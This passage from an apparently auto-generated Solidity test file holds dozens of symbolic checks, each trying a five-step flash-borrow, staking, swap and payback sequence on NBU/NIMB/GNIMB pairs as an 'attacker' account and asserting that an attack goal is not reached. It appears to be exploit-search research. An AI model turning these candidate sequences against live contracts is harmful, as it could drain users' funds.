        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1917(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1918(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1919(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1920(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1921(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1922(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1923(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1924(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1925(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1926(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1927(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1928(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1929(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1930(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1931(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1932(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1933(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1934(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1935(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1936(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1937(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1938(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1939(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1940(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1941(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1942(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1943(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1944(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1945(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1946(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1947(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1948(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1949(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1950(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1951(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1952(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1953(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1954(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1955(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1956(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1957(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1958(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1959(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1960(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1961(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1962(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1963(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1964(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1965(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1966(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1967(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
